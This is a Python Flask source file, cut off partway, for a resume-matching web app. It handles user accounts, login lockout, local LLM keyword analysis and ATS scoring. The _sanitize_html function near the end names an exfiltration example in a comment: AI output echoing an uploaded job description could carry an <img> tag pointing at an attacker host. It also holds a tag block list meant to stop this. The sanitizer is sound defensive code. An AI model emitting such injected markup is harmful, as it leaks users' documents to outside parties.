import io
import json
import os
import re
import secrets
import sqlite3
import threading
import time
from datetime import datetime, timezone, timedelta
from functools import wraps

import markdown as md
import requests
from bs4 import BeautifulSoup
from flask import (
    Flask, render_template, request, jsonify, send_file,
    session, redirect, url_for, flash,
)
from html import escape as html_escape
from werkzeug.security import generate_password_hash, check_password_hash

import mailer
import ocr
import resume_builder
import sheets_sync

app = Flask(__name__)

# Secret key used to sign the login session cookie. Set FLASK_SECRET_KEY in
# your environment for real deployments; this fallback is fine for local/
# personal use but is NOT safe to rely on if this app is ever exposed
# beyond your own machine.
def _load_secret_key() -> str:
    """FLASK_SECRET_KEY from .env if set; otherwise a random key created once and
    kept in .flask_secret_key (so sessions - and the email-verified flag stored
    in them - cannot be forged with a publicly known default key)."""
    key = os.environ.get("FLASK_SECRET_KEY", "").strip()
    if key:
        return key
    key_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".flask_secret_key")
    try:
        with open(key_file, encoding="utf-8") as fh:
            saved = fh.read().strip()
        if saved:
            return saved
    except OSError:
        pass
    key = secrets.token_hex(32)
    try:
        with open(key_file, "w", encoding="utf-8") as fh:
            fh.write(key)
    except OSError:
        pass
    return key


app.secret_key = _load_secret_key()
app.config["MAX_CONTENT_LENGTH"] = 25 * 1024 * 1024   # total upload limit

# ---------------------------------------------------------------------------
# Database (SQLite) - stores registered users and the security/audit fields
# requested: unique user id, name, age, email, how many times they've
# logged in, signup/login/logout timestamps, and when they last generated
# a PDF report. One row per user (never duplicated on repeat logins) -
# login_count is incremented on the existing row instead.
# ---------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "resume_matcher.db")


def get_db_connection() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    conn = get_db_connection()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS user_details (
            user_id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            age INTEGER NOT NULL,
            email TEXT NOT NULL UNIQUE,
            password_hash TEXT NOT NULL,
            login_count INTEGER NOT NULL DEFAULT 0,
            signup_time TEXT NOT NULL,
            last_login_time TEXT,
            last_logout_time TEXT,
            last_pdf_generated_time TEXT,
            account_type TEXT NOT NULL DEFAULT 'user',
            is_approved INTEGER NOT NULL DEFAULT 1
        )
    """)
    # Lightweight migration for databases created before account_type /
    # is_approved existed - adding a column is a no-op if it's already there.
    existing_cols = {row["name"] for row in conn.execute("PRAGMA table_info(user_details)")}
    if "account_type" not in existing_cols:
        conn.execute("ALTER TABLE user_details ADD COLUMN account_type TEXT NOT NULL DEFAULT 'user'")
    if "is_approved" not in existing_cols:
        conn.execute("ALTER TABLE user_details ADD COLUMN is_approved INTEGER NOT NULL DEFAULT 1")

    # Latest resume / job-description match on file for each user - stored
    # on the same row (never a new row), same "update in place" pattern as
    # the rest of this table. Lets admins view/download the actual
    # documents a user submitted, not just their account details.
    match_columns = {
        "latest_resume_filename": "TEXT",
        "latest_resume_mimetype": "TEXT",
        "latest_resume_blob": "BLOB",
        "latest_resume_text": "TEXT",
        "latest_job_filename": "TEXT",
        "latest_job_mimetype": "TEXT",
        "latest_job_blob": "BLOB",
        "latest_job_text": "TEXT",
        "latest_match_percent": "TEXT",
        "latest_match_markdown": "TEXT",
        "match_count": "INTEGER NOT NULL DEFAULT 0",
        "match_updated_at": "TEXT",
    }
    for col_name, col_type in match_columns.items():
        if col_name not in existing_cols:
            conn.execute(f"ALTER TABLE user_details ADD COLUMN {col_name} {col_type}")

    # Wrong-password lockout: 3 wrong passwords in a row lock the account
    # until an admin unlocks it.
    lock_columns = {
        "failed_attempts": "INTEGER NOT NULL DEFAULT 0",
        "is_locked": "INTEGER NOT NULL DEFAULT 0",
        "locked_at": "TEXT",
    }
    for col_name, col_type in lock_columns.items():
        if col_name not in existing_cols:
            conn.execute(f"ALTER TABLE user_details ADD COLUMN {col_name} {col_type}")

    # Every analysis a user runs (user_details only keeps the LATEST one), so the History page can
    # reopen old results and build an ATS resume from any of them.
    conn.execute("""
        CREATE TABLE IF NOT EXISTS match_history (
            history_id       INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id          INTEGER NOT NULL,
            created_at       TEXT NOT NULL,
            resume_filename  TEXT,
            job_filename     TEXT,
            match_percent    TEXT,
            analysis_markdown TEXT,
            resume_text      TEXT,
            job_text         TEXT,
            resume_meta      TEXT,
            keywords_json    TEXT,
            improved_json    TEXT,
            improved_at      TEXT
        )
    """)
    conn.execute("CREATE INDEX IF NOT EXISTS idx_match_history_user ON match_history (user_id, history_id)")

    # One-time codes for verifying an email address on the signup form. Only the
    # hash of the code is stored. No account exists until the code is verified.
    conn.execute("DROP TABLE IF EXISTS signup_otps")  # older design, no longer used
    conn.execute("""
        CREATE TABLE IF NOT EXISTS email_otps (
            email          TEXT PRIMARY KEY,
            code_hash      TEXT NOT NULL,
            expires_at     REAL NOT NULL,
            wrong_tries    INTEGER NOT NULL DEFAULT 0,
            sends          INTEGER NOT NULL DEFAULT 1,
            last_sent_at   REAL NOT NULL,
            created_at     REAL NOT NULL
        )
    """)

    conn.commit()
    conn.close()


init_db()


IST = timezone(timedelta(hours=5, minutes=30))


def _now() -> str:
    """Current timestamp in Indian Standard Time (UTC+5:30), as a fixed,
    sortable string - used for every security/audit timestamp column.
    """
    return datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")


def admin_exists() -> bool:
    """True if at least one approved admin account already exists - used to
    auto-approve the very first admin signup (bootstrap), since otherwise
    no one would ever be able to approve anyone.
    """
    conn = get_db_connection()
    row = conn.execute(
        "SELECT 1 FROM user_details WHERE account_type = 'admin' AND is_approved = 1 LIMIT 1"
    ).fetchone()
    conn.close()
    return row is not None


def create_user(name: str, age: int, email: str, password: str | None, account_type: str = "user",
                password_hash: str | None = None) -> tuple[bool, bool]:
    """Insert a new user row. Returns (created, is_approved).
    created is False (instead of raising) if the email is already
    registered, since that's an expected, user-facing case rather than a
    real error. New admin accounts are auto-approved only if no other
    approved admin exists yet (bootstrapping the very first admin);
    otherwise they start pending until an existing admin approves them.
    """
    is_approved = 1 if account_type != "admin" or not admin_exists() else 0
    conn = get_db_connection()
    try:
        conn.execute(
            "INSERT INTO user_details "
            "(name, age, email, password_hash, login_count, signup_time, account_type, is_approved) "
            "VALUES (?, ?, ?, ?, 0, ?, ?, ?)",
            (name, age, email.strip().lower(), password_hash or generate_password_hash(password), _now(), account_type, is_approved),
        )
        conn.commit()
        created_is_approved = bool(is_approved)
        _sync_to_sheets()
        return True, created_is_approved
    except sqlite3.IntegrityError:
        return False, False
    finally:
        conn.close()


def get_all_users() -> list[sqlite3.Row]:
    conn = get_db_connection()
    users = conn.execute(
        "SELECT * FROM user_details ORDER BY user_id ASC"
    ).fetchall()
    conn.close()
    return users


def _sync_to_sheets() -> None:
    """Pushes the full current user_details table to Google Sheets. Called
    after every write below, so the sheet always mirrors the table
    instantly. Never raises - a Sheets/network hiccup should never break
    signup, login, or matching; it's just logged to the console.
    """
    # Runs in a background thread so a slow / blocked / offline Google
    # connection never makes signup, login or approval wait. Bursts of
    # writes are coalesced: if a sync is already running, it just does one
    # more pass afterwards with the latest data, so the sheet still ends up
    # exactly matching the database.
    with _sync_guard:
        if _sync_state["running"]:
            _sync_state["dirty"] = True
            return
        _sync_state["running"] = True
    threading.Thread(target=_sync_worker, name="sheets-sync").start()


_sync_guard = threading.Lock()
_sync_state = {"running": False, "dirty": False}


def _sync_worker() -> None:
    while True:
        try:
            sheets_sync.sync_rows([dict(row) for row in get_all_users()])
        except Exception as exc:  # noqa: BLE001 - never let a sync problem escape
            print(f"[sheets_sync] Skipped Google Sheets sync: {exc}")
        with _sync_guard:
            if _sync_state["dirty"]:
                _sync_state["dirty"] = False
                continue
            _sync_state["running"] = False
            return


def clear_all_users() -> int:
    """Drops user_details entirely and recreates it via init_db(). A plain
    DELETE would empty the table but leave SQLite's internal AUTOINCREMENT
    counter (in sqlite_sequence) at its old high-water mark, so the next
    signup would still get user_id 4, 5, ... instead of starting over.
    Dropping and recreating the table clears that counter too, so the next
    signup really does start at user_id = 1. Returns how many rows existed
    before the reset, for a friendly confirmation message.
    """
    before = len(get_all_users())
    conn = get_db_connection()
    conn.execute("DROP TABLE IF EXISTS user_details")
    conn.commit()
    conn.close()
    init_db()
    _sync_to_sheets()
    return before


def approve_user(user_id: int) -> None:
    conn = get_db_connection()
    conn.execute("UPDATE user_details SET is_approved = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    _sync_to_sheets()


MAX_HISTORY_PER_USER = 200


def add_match_history(user_id, resume_filename, job_filename, match_markdown, resume_text, job_text,
                      resume_meta, keywords) -> int:
    """Saves one analysis; keeps only each user's newest MAX_HISTORY_PER_USER. Returns its id."""
    conn = get_db_connection()
    try:
        cur = conn.execute(
            "INSERT INTO match_history (user_id, created_at, resume_filename, job_filename, match_percent, "
            "analysis_markdown, resume_text, job_text, resume_meta, keywords_json) VALUES (?,?,?,?,?,?,?,?,?,?)",
            (user_id, _now(), resume_filename, job_filename, _extract_match_percent(match_markdown),
             match_markdown, resume_text, job_text, json.dumps(resume_meta or {}),
             json.dumps(keywords) if keywords else None),
        )
        history_id = cur.lastrowid
        conn.execute(
            "DELETE FROM match_history WHERE user_id = ? AND history_id NOT IN "
            "(SELECT history_id FROM match_history WHERE user_id = ? ORDER BY history_id DESC LIMIT ?)",
            (user_id, user_id, MAX_HISTORY_PER_USER),
        )
        conn.commit()
        return history_id
    finally:
        conn.close()


def list_match_history(user_id: int):
    conn = get_db_connection()
    try:
        return conn.execute(
            "SELECT history_id, created_at, resume_filename, job_filename, match_percent, improved_at "
            "FROM match_history WHERE user_id = ? ORDER BY history_id DESC", (user_id,)
        ).fetchall()
    finally:
        conn.close()


def get_match_history_entry(history_id: int, user_id: int):
    """One entry - only if it belongs to this user."""
    conn = get_db_connection()
    try:
        return conn.execute(
            "SELECT * FROM match_history WHERE history_id = ? AND user_id = ?", (history_id, user_id)
        ).fetchone()
    finally:
        conn.close()


def delete_match_history_entry(history_id: int, user_id: int) -> None:
    conn = get_db_connection()
    conn.execute("DELETE FROM match_history WHERE history_id = ? AND user_id = ?", (history_id, user_id))
    conn.commit()
    conn.close()


def save_improved_resume(history_id: int, user_id: int, improved: dict) -> None:
    conn = get_db_connection()
    conn.execute("UPDATE match_history SET improved_json = ?, improved_at = ? WHERE history_id = ? AND user_id = ?",
                 (json.dumps(improved), _now(), history_id, user_id))
    conn.commit()
    conn.close()


MAX_FAILED_ATTEMPTS = 3


def register_failed_login(user_id: int) -> tuple[int, bool]:
    """Counts one more wrong password. At MAX_FAILED_ATTEMPTS the account is
    locked. Returns (attempts_so_far, just_locked)."""
    conn = get_db_connection()
    try:
        conn.execute(
            "UPDATE user_details SET failed_attempts = failed_attempts + 1 WHERE user_id = ? AND is_locked = 0",
            (user_id,),
        )
        row = conn.execute(
            "SELECT failed_attempts, is_locked FROM user_details WHERE user_id = ?", (user_id,)
        ).fetchone()
        attempts = row["failed_attempts"] if row else 0
        just_locked = False
        if row and not row["is_locked"] and attempts >= MAX_FAILED_ATTEMPTS:
            conn.execute("UPDATE user_details SET is_locked = 1, locked_at = ? WHERE user_id = ?", (_now(), user_id))
            just_locked = True
        conn.commit()
        return attempts, just_locked
    finally:
        conn.close()


def reset_failed_attempts(user_id: int) -> None:
    conn = get_db_connection()
    conn.execute("UPDATE user_details SET failed_attempts = 0 WHERE user_id = ? AND failed_attempts != 0", (user_id,))
    conn.commit()
    conn.close()


def unlock_user(user_id: int) -> None:
    conn = get_db_connection()
    conn.execute(
        "UPDATE user_details SET is_locked = 0, failed_attempts = 0, locked_at = NULL WHERE user_id = ?", (user_id,)
    )
    conn.commit()
    conn.close()


def get_email_otp(email: str):
    conn = get_db_connection()
    try:
        return conn.execute("SELECT * FROM email_otps WHERE email = ?", (email,)).fetchone()
    finally:
        conn.close()


def save_email_otp(email, code_hash, expires_at, now, sends=1, created_at=None):
    conn = get_db_connection()
    try:
        conn.execute(
            "INSERT OR REPLACE INTO email_otps "
            "(email, code_hash, expires_at, wrong_tries, sends, last_sent_at, created_at) "
            "VALUES (?, ?, ?, 0, ?, ?, ?)",
            (email, code_hash, expires_at, sends, now, created_at or now),
        )
        conn.commit()
    finally:
        conn.close()


def bump_email_otp_wrong(email: str) -> int:
    conn = get_db_connection()
    try:
        conn.execute("UPDATE email_otps SET wrong_tries = wrong_tries + 1 WHERE email = ?", (email,))
        conn.commit()
        row = conn.execute("SELECT wrong_tries FROM email_otps WHERE email = ?", (email,)).fetchone()
        return row["wrong_tries"] if row else 0
    finally:
        conn.close()


def delete_email_otp(email: str) -> None:
    conn = get_db_connection()
    conn.execute("DELETE FROM email_otps WHERE email = ?", (email,))
    conn.commit()
    conn.close()


def _extract_match_percent(markdown_text: str) -> str | None:
    """Pulls the first "NN%" out of the model's Match Analysis section, for
    a compact column in the admin table. Returns None if no percentage is
    found (should be rare, but the model's output isn't 100% guaranteed).
    """
    match = re.search(r"(\d{1,3})\s*%", markdown_text)
    return f"{match.group(1)}%" if match else None


def record_match_result(
    user_id: int,
    resume_filename: str,
    resume_mimetype: str,
    resume_bytes: bytes,
    resume_text: str,
    job_filename: str,
    job_mimetype: str,
    job_bytes: bytes,
    job_text: str,
    match_markdown: str,
) -> None:
    """Saves the most recent resume/JD a user matched (original files plus
    extracted text) and the match result, on that user's existing row -
    never a new row, matching the rest of this table's update-in-place
    pattern. Lets the admin DB viewer show and download the real
    documents, not just account details.
    """
    conn = get_db_connection()
    conn.execute(
        """
        UPDATE user_details
        SET latest_resume_filename = ?, latest_resume_mimetype = ?, latest_resume_blob = ?, latest_resume_text = ?,
            latest_job_filename = ?, latest_job_mimetype = ?, latest_job_blob = ?, latest_job_text = ?,
            latest_match_percent = ?, latest_match_markdown = ?,
            match_count = match_count + 1, match_updated_at = ?
        WHERE user_id = ?
        """,
        (
            resume_filename, resume_mimetype, resume_bytes, resume_text,
            job_filename, job_mimetype, job_bytes, job_text,
            _extract_match_percent(match_markdown), match_markdown,
            _now(), user_id,
        ),
    )
    conn.commit()
    conn.close()
    _sync_to_sheets()


def get_user_by_email(email: str) -> sqlite3.Row | None:
    conn = get_db_connection()
    user = conn.execute(
        "SELECT * FROM user_details WHERE email = ?", (email.strip().lower(),)
    ).fetchone()
    conn.close()
    return user


def get_user_by_id(user_id: int) -> sqlite3.Row | None:
    conn = get_db_connection()
    user = conn.execute(
        "SELECT * FROM user_details WHERE user_id = ?", (user_id,)
    ).fetchone()
    conn.close()
    return user


def record_login(user_id: int) -> None:
    """Increment the existing user's login count and stamp the login time
    - never inserts a new row, so repeat logins update the same record.
    """
    conn = get_db_connection()
    conn.execute(
        "UPDATE user_details SET login_count = login_count + 1, last_login_time = ? WHERE user_id = ?",
        (_now(), user_id),
    )
    conn.commit()
    conn.close()
    _sync_to_sheets()


def record_logout(user_id: int) -> None:
    conn = get_db_connection()
    conn.execute(
        "UPDATE user_details SET last_logout_time = ? WHERE user_id = ?",
        (_now(), user_id),
    )
    conn.commit()
    conn.close()
    _sync_to_sheets()


def record_pdf_generated(user_id: int) -> None:
    conn = get_db_connection()
    conn.execute(
        "UPDATE user_details SET last_pdf_generated_time = ? WHERE user_id = ?",
        (_now(), user_id),
    )
    conn.commit()
    conn.close()
    _sync_to_sheets()


def login_required(view_func):
    """Protects normal page routes - redirects to /login if not signed in."""
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        if not session.get("user_id"):
            return redirect(url_for("login"))
        return view_func(*args, **kwargs)
    return wrapped


def admin_required(view_func):
    """Protects admin-only page routes - redirects non-admins to the main
    page (they're logged in, just not authorized for this route).
    """
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        if not session.get("user_id"):
            return redirect(url_for("login"))
        if session.get("account_type") != "admin":
            return redirect(url_for("index"))
        return view_func(*args, **kwargs)
    return wrapped


def api_login_required(view_func):
    """Protects AJAX/JSON routes (/match, /download-pdf) - returns a 401
    JSON response instead of an HTML redirect, since the frontend expects
    JSON back and needs to redirect the browser itself.
    """
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        if not session.get("user_id"):
            return jsonify({"error": "Please log in to continue.", "login_required": True}), 401
        return view_func(*args, **kwargs)
    return wrapped


# Model used for analysis. Chosen to be lightweight enough for low-RAM,
# no-GPU computers (only ~1GB RAM needed). Change this if you have a
# more powerful machine and want better quality answers.
# A small model keeps things fast. Set OLLAMA_MODEL (e.g. qwen2.5:3b) for better rewrites.
MODEL_NAME = os.environ.get("OLLAMA_MODEL", "qwen2.5:0.5b")

# Small models have a limited context window, so very long documents are
# trimmed to keep the request fast and avoid errors/timeouts.
MAX_CHARS_PER_DOCUMENT = 10000

# Section headings the model is asked to produce, and which of them get
# the "-> " arrow treatment in the rendered report. "keyword match" is
# added by build_keyword_match_html(), not by the model.
SCORE_HEADING = "match analysis"
ARROW_HEADINGS = {"key points", "need to change", "conclusion", "keyword match", "ats friendliness"}

# Word-count band used by the ATS Friendliness check. Resumes shorter than
# this often read as too sparse; much longer ones risk being trimmed by
# ATS parsers or skimmed too quickly by a recruiter.
ATS_MIN_WORDS = 150
ATS_MAX_WORDS = 1200


def _call_ollama(prompt: str, num_predict: int, temperature: float = 0.2) -> str:
    """Send `prompt` to the local Ollama model and return its raw text
    response. Raises requests.exceptions.RequestException on any
    connection/HTTP/timeout failure - callers decide how to handle that.
    """
    response = requests.post(
        "http://localhost:11434/api/generate",
        json={
            "model": MODEL_NAME,
            "prompt": prompt,
            "stream": False,
            "options": {
                # Lower temperature makes the output far more consistent
                # between runs on the same inputs (small models are
                # especially prone to wandering at default settings). A
                # fixed seed helps further, though tiny local models can
                # still vary slightly run to run.
                "temperature": temperature,
                "seed": 42,
                "num_predict": num_predict,
            },
        },
        timeout=120,
    )
    response.raise_for_status()
    return response.json().get("response", "")


# Prompt used to have the model itself pull skills and work-type out of
# the job description and check them against the resume - including
# recognizing synonyms/abbreviations (e.g. "JS" <-> "JavaScript", "K8s"
# <-> "Kubernetes") as the same thing, since that's a language-understanding
# task the model is well suited for rather than a fixed lookup table.
KEYWORD_MATCH_PROMPT = """
You are a resume/job-matching assistant. Compare the Job Description and Resume below.

TASK 1 - Skills: Identify every concrete skill, tool, technology, or
competency mentioned in the Job Description (ignore company names, locations,
and generic filler words). Group each into exactly ONE of these categories:
Languages, Frameworks & Libraries, Tools, Databases, Cloud & DevOps, Data & AI,
Design, Project Management, Business & Office, Soft Skills, APIs & Architecture,
Other. Use "Tools" for named software applications/utilities that aren't a
programming language or coding framework and aren't already covered by a more
specific category above - e.g. IDEs (VS Code, IntelliJ, PyCharm), version
control (Git, GitHub, GitLab), build tools (Webpack, Maven, Gradle), testing
tools (Postman, Selenium, JUnit), and communication/collaboration apps (Slack,
Zoom, Microsoft Teams). If the same skill is referred to by an abbreviation or
synonym elsewhere (e.g. "JS" and "JavaScript", "K8s" and "Kubernetes", "ML" and
"Machine Learning"), treat them as ONE skill and report it using its most
common full name. For each skill, decide whether it (or an equivalent
synonym/abbreviation) also appears anywhere in the Resume.

TASK 2 - Work Type: Identify which of these employment types are mentioned
in the Job Description: Full-Time, Part-Time, Internship, Remote, Hybrid,
Online, Offline. For each one found, decide whether it (or an equivalent
phrase, e.g. "work from home" for Remote) also appears in the Resume.

Respond with ONLY valid JSON and nothing else - no preamble, no code fence,
no commentary - in EXACTLY this shape:
{{
  "skills": [
    {{"category": "Languages", "skill": "JavaScript", "in_resume": true}}
  ],
  "work_type": [
    {{"type": "Full-Time", "in_resume": true}}
  ]
}}

Job Description:
{job_text}

Resume:
{resume_text}
"""


def _parse_keyword_json(raw_text: str) -> dict | None:
    """Parse the model's keyword-match response into a dict. Tolerant of a
    stray code fence or extra commentary around the JSON (small models
    sometimes add both despite instructions). Returns None if no valid
    JSON object could be found/parsed.
    """
    text = strip_code_fence(raw_text)
    match = re.search(r"\{.*\}", text, re.DOTALL)
    if not match:
        return None
    try:
        return json.loads(match.group(0))
    except (json.JSONDecodeError, TypeError):
        return None



def _render_two_column_table(
    left_label: str, left_items: list[str], left_class: str,
    right_label: str, right_items: list[str], right_class: str,
) -> str:
    """Render two labeled lists side by side as an HTML table. A real
    <table> is used (instead of CSS flex/float columns) because the PDF
    renderer (xhtml2pdf) doesn't support flexbox - it would otherwise
    silently stack the two columns one after another instead of side by
    side. Tables render side by side reliably in both the web view and
    the PDF. Left/right position classes are added explicitly (rather
    than relying on a :first-child CSS selector) since xhtml2pdf's CSS
    support is limited. Item/label text is HTML-escaped since it may
    originate from the AI model's response.
    """
    def render_cell(label, items, css_class, position_class):
        if items:
            list_html = "<ul>" + "".join(f"<li>{html_escape(item)}</li>" for item in items) + "</ul>"
        else:
            list_html = '<p class="keyword-empty">None</p>'
        return f'<td class="keyword-col {css_class} {position_class}"><h4>{html_escape(label)}</h4>{list_html}</td>'

    return (
        '<table class="keyword-match-table"><tr>'
        + render_cell(left_label, left_items, left_class, "keyword-col-left")
        + render_cell(right_label, right_items, right_class, "keyword-col-right")
        + "</tr></table>"
    )


def analyze_keywords(resume_text: str, job_text: str) -> dict | None:
    """Asks the model for the job's skills / work types and whether the resume has them.
    Returns the parsed dict, or None if the model call fails or finds nothing."""
    prompt = KEYWORD_MATCH_PROMPT.format(job_text=job_text, resume_text=resume_text)
    try:
        raw_response = _call_ollama(prompt, num_predict=700, temperature=0.1)
    except requests.exceptions.RequestException:
        return None
    return _parse_keyword_json(raw_response) or None


def build_keyword_match_html(resume_text: str, job_text: str) -> str:
    data = analyze_keywords(resume_text, job_text)
    return render_keyword_html(data) if data else ""


def render_keyword_html(data: dict) -> str:
    """Build a ready-to-embed HTML block comparing the job description
    against the resume, using the AI model itself to identify skills
    (grouped into categories) and work type (Full-Time, Part-Time,
    Internship, Remote, Hybrid, Online, Offline). The model is asked to
    recognize synonyms/abbreviations (e.g. "JS"/"JavaScript",
    "K8s"/"Kubernetes") as the same skill on its own, rather than relying
    on a fixed lookup table. Returns "" if the model call fails or finds
    nothing to report, so the section is simply skipped rather than shown
    broken or empty.
    """
    sections_html = ""

    categories: dict[str, list[tuple[str, bool]]] = {}
    for item in data.get("skills") or []:
        if not isinstance(item, dict):
            continue
        skill = str(item.get("skill", "")).strip()
        if not skill:
            continue
        category = str(item.get("category") or "Other").strip() or "Other"
        in_resume = bool(item.get("in_resume"))
        bucket = categories.setdefault(category, [])
        if not any(existing.lower() == skill.lower() for existing, _ in bucket):
            bucket.append((skill, in_resume))

    for category, entries in categories.items():
        matched = [s for s, ok in entries if ok]
        missing = [s for s, ok in entries if not ok]
        category_table_html = _render_two_column_table(
            f"Matched ({len(matched)})", matched, "keyword-matched",
            f"Missing ({len(missing)})", missing, "keyword-missing",
        )
        sections_html += f'<h4 class="keyword-subheading">{html_escape(category)}</h4>{category_table_html}'

    work_type_matched, work_type_missing, seen_types = [], [], set()
    for item in data.get("work_type") or []:
        if not isinstance(item, dict):
            continue
        wtype = str(item.get("type", "")).strip()
        if not wtype or wtype.lower() in seen_types:
            continue
        seen_types.add(wtype.lower())
        (work_type_matched if item.get("in_resume") else work_type_missing).append(wtype)

    if work_type_matched or work_type_missing:
        work_type_table_html = _render_two_column_table(
            f"Matched ({len(work_type_matched)})", work_type_matched, "keyword-matched",
            f"Missing ({len(work_type_missing)})", work_type_missing, "keyword-missing",
        )
        sections_html += f'<h4 class="keyword-subheading">Work Type</h4>{work_type_table_html}'

    if not sections_html:
        return ""

    return f"""
## Keyword Match
{sections_html}
"""


def _ats_has_contact_info(text: str) -> bool:
    has_email = bool(re.search(r"[\w.+-]+@[\w-]+\.[a-zA-Z]{2,}", text))
    has_phone = bool(re.search(r"(\+?\d[\d\-\s().]{7,}\d)", text))
    return has_email and has_phone


def _ats_has_standard_sections(text: str) -> bool:
    lowered = text.lower()
    section_aliases = {
        "experience": ["experience", "employment history", "work history"],
        "education": ["education"],
        "skills": ["skills"],
    }
    return all(any(alias in lowered for alias in aliases) for aliases in section_aliases.values())


def _ats_has_bullets(text: str) -> bool:
    return bool(re.search(r"(^|\n)\s*[•\-*▪◦]\s+", text))


def _ats_unusual_character_count(text: str) -> int:
    # Counts non-ASCII characters (emoji, exotic bullets/symbols, decorative
    # glyphs) that some ATS parsers choke on or render as garbage.
    return len(re.findall(r"[^\x00-\x7F]", text))


def build_ats_check_html(resume_text: str, has_tables: bool = False, is_scanned: bool = False) -> str:
    """Build a ready-to-embed HTML block scoring how well the resume's raw
    text is likely to survive an Applicant Tracking System parse. This is
    computed directly from the resume text/file structure (not by the LLM),
    covering things a small local model can't reliably judge: contact info
    presence, section headings, layout (tables), scanned/image PDFs, etc.
    """
    word_count = len(resume_text.split())

    checks = [
        ("Contact info detected (email & phone)", _ats_has_contact_info(resume_text)),
        ("Standard section headings (Experience, Education, Skills)", _ats_has_standard_sections(resume_text)),
        ("Uses bullet points for readability", _ats_has_bullets(resume_text)),
        (f"Readable length ({ATS_MIN_WORDS}-{ATS_MAX_WORDS} words)", ATS_MIN_WORDS <= word_count <= ATS_MAX_WORDS),
        ("No tables/columns detected (ATS-safe layout)", not has_tables),
        ("Text is machine-readable, not a scanned image", not is_scanned),
        ("Minimal special characters/symbols", _ats_unusual_character_count(resume_text) < 20),
    ]

    passed = [label for label, ok in checks if ok]
    failed = [label for label, ok in checks if not ok]
    score = round(100 * len(passed) / len(checks))

    table_html = _render_two_column_table(
        f"Passed ({len(passed)})", passed, "keyword-matched",
        f"Needs Attention ({len(failed)})", failed, "keyword-missing",
    )

    return f"""
## ATS Friendliness
<div class="ats-score-box">
  <div class="ats-score-value">{score}%</div>
  <div class="ats-score-label">ATS Compatibility</div>
</div>
{table_html}
"""


def strip_code_fence(text: str) -> str:
    """Small local models often wrap their whole reply in a ``` code fence
    even when told to just write Markdown. If left in, the entire report
    (including our injected keyword-match HTML) gets rendered as one
    literal code block instead of being parsed. Strip a leading/trailing
    fence line if present.
    """
    text = text.strip()
    text = re.sub(r"^```[a-zA-Z]*[ \t]*\n", "", text)
    text = re.sub(r"\n?```$", "", text)
    return text.strip()


def insert_section_before_heading(markdown_text: str, heading_regex: str, section_markdown: str) -> str:
    """Insert a pre-built Markdown/HTML block right before the first heading
    matching `heading_regex`. Falls back to appending at the end if that
    heading isn't found (e.g. the model deviated from the requested
    structure). No-op if `section_markdown` is empty.
    """
    if not section_markdown:
        return markdown_text

    match = re.search(heading_regex, markdown_text, re.IGNORECASE | re.MULTILINE)
    if match:
        idx = match.start()
        return markdown_text[:idx] + section_markdown + "\n\n" + markdown_text[idx:]
    return markdown_text.rstrip() + "\n\n" + section_markdown


def extract_pdf_text(file_bytes: bytes) -> tuple[str, bool]:
    """Extract text from an uploaded PDF file. Also returns `is_scanned`:
    True when the PDF has pages but almost no extractable text, which
    usually means it's a scanned image rather than real text - a common
    reason resumes fail ATS parsing.
    """
    text = ""
    page_count = 0
    import fitz  # PyMuPDF for PDF parsing (loaded only when needed)
    with fitz.open(stream=file_bytes, filetype="pdf") as doc:
        page_count = doc.page_count
        for page in doc:
            text += page.get_text()
    is_scanned = page_count > 0 and len(text.strip()) < 20 * page_count
    return text, is_scanned


def extract_docx_text(file_bytes: bytes) -> tuple[str, bool]:
    """Extract text from an uploaded .docx file, including any table cells.
    Also returns `has_tables`: True if the document uses tables, which is
    a common ATS-parsing hazard (content can be read out of order or lost).
    """
    from docx import Document  # python-docx for .docx parsing (loaded only when needed)
    document = Document(io.BytesIO(file_bytes))
    parts = [p.text for p in document.paragraphs if p.text.strip()]

    has_tables = len(document.tables) > 0
    for table in document.tables:
        for row in table.rows:
            for cell in row.cells:
                if cell.text.strip():
                    parts.append(cell.text)

    return "\n".join(parts), has_tables


def get_document_data(filename: str, file_bytes: bytes) -> tuple[str, dict]:
    """Return (text, meta) from an uploaded PDF, DOCX, or TXT file's raw
    bytes. `meta` carries layout flags (`has_tables`, `is_scanned`) used by
    the ATS Friendliness check; both are always False for plain-text files.
    """
    filename = (filename or "").lower()

    if filename.endswith((".png", ".jpg", ".jpeg")):
        # A picture of a resume: read it with OCR. An image is NOT machine-readable for an
        # ATS, so it is flagged like a scanned PDF (the ATS panel will say so).
        return ocr.extract_image_text(file_bytes), {"has_tables": False, "is_scanned": True, "is_image": True}

    if filename.endswith(".pdf"):
        text, is_scanned = extract_pdf_text(file_bytes)
        if is_scanned and len(text.strip()) < 50:
            try:
                text = ocr.extract_scanned_pdf_text(file_bytes) or text
            except Exception:  # noqa: BLE001 - OCR is a bonus here; keep the original result
                pass
        return text, {"has_tables": False, "is_scanned": is_scanned}

    if filename.endswith(".docx"):
        text, has_tables = extract_docx_text(file_bytes)
        return text, {"has_tables": has_tables, "is_scanned": False}

    text = file_bytes.decode("utf-8", errors="ignore")
    return text, {"has_tables": False, "is_scanned": False}


def _sanitize_html(html_text: str) -> str:
    """The report HTML is built from AI output (which can echo text from an uploaded job description),
    so drop anything executable before it is shown or stored."""
    soup = BeautifulSoup(html_text, "html.parser")
    # No images/media either: an injected <img src="https://attacker/?data=..."> would leak text when it loads.
    for tag in soup.find_all(["script", "iframe", "object", "embed", "link", "meta", "form", "style",
                              "img", "picture", "video", "audio", "source", "svg"]):
        tag.decompose()
    for tag in soup.find_all(True):
        for attr in list(tag.attrs):
            value = " ".join(tag.attrs[attr]) if isinstance(tag.attrs[attr], list) else str(tag.attrs[attr])
            if attr.lower().startswith("on") or value.strip().lower().startswith(("javascript:", "data:text/html")):
                del tag.attrs[attr]
    return str(soup)


def format_report_html(markdown_text: str) -> str:
    """Convert the model's Markdown into the report layout used on both the
    results page and the PDF:
      - "Match Analysis" becomes a big centered percentage headline followed
        by the model's explanation paragraph underneath.
